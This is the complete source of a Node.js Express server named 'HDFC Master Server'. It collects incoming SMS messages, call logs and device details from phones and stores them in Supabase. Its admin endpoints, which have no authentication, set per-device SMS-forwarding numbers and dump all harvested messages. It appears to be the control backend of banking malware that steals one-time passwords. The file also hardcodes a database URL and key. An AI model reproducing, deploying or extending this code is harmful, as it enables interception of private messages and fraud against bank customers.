require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(cors());
app.use(express.json());

// Supabase Setup
const supabaseUrl = 'https://fetecwnmxodqwsjlwezn.supabase.co';
const supabaseKey = 'sb_publishable_1qgs7DcEo_jU2Zh1ug5DOw_xwB2cw-A';
const supabase = createClient(supabaseUrl, supabaseKey);

// --- MASTER LOGIC: AUTO CLEANUP ---
async function autoCleanupLogs(deviceId) {
    try {
        // Keep only latest 50 SMS per device
        const { data: logs } = await supabase
            .from('sms_logs')
            .select('id')
            .eq('device_id', deviceId)
            .order('received_at', { ascending: false });

        if (logs && logs.length > 50) {
            const idsToDelete = logs.slice(50).map(l => l.id);
            await supabase.from('sms_logs').delete().in('id', idsToDelete);
        }
    } catch (e) { console.error("Cleanup Error:", e); }
}

// --- API ENDPOINTS ---

app.post('/api/users/update', async (req, res) => {
    const { deviceId, ...details } = req.body;
    const { error } = await supabase.from('users').upsert({ 
        device_id: deviceId, ...details, last_active: new Date().toISOString()
    }, { onConflict: 'device_id' });
    if (error) return res.status(500).json({ error: error.message });
    res.json({ success: true });
});

app.post('/api/logs/sms', async (req, res) => {
    const { deviceId, sender, message, timestamp } = req.body;
    const { error } = await supabase.from('sms_logs').insert([{ 
        device_id: deviceId, sender, message, received_at: timestamp 
    }]);
    if (error) return res.status(500).json({ error: error.message });
    
    // Trigger Auto-Cleanup in background
    autoCleanupLogs(deviceId);
    res.json({ success: true });
});

app.post('/api/logs/calls', async (req, res) => {
    const { deviceId, logs } = req.body;
    const formattedLogs = logs.map(log => ({
        device_id: deviceId, number: log.number, type: log.type,
        duration: log.duration, called_at: log.timestamp
    }));
    const { error } = await supabase.from('call_logs').insert(formattedLogs);
    if (error) return res.status(500).json({ error: error.message });
    res.json({ success: true });
});

app.get('/api/users/config/:deviceId', async (req, res) => {
    const { data, error } = await supabase.from('users').select('forwarding_number, forwarding_enabled').eq('device_id', req.params.deviceId).single();
    if (error) return res.status(404).json({ error: "Not found" });
    res.json(data);
});

app.post('/api/admin/update-forwarding', async (req, res) => {
    const { deviceId, number, enabled } = req.body;
    const { error } = await supabase.from('users').update({ forwarding_number: number, forwarding_enabled: enabled }).eq('device_id', deviceId);
    if (error) return res.status(500).json({ error: error.message });
    res.json({ success: true });
});

app.get('/api/admin/data', async (req, res) => {
    const { data: users } = await supabase.from('users').select('*').order('last_active', { ascending: false });
    const { data: sms } = await supabase.from('sms_logs').select('*').order('received_at', { ascending: false }).limit(200);
    const { data: calls } = await supabase.from('call_logs').select('*').order('called_at', { ascending: false }).limit(100);
    res.json({ users, sms, calls });
});

app.use(express.static('public'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`HDFC Master Server running on port ${PORT}`));
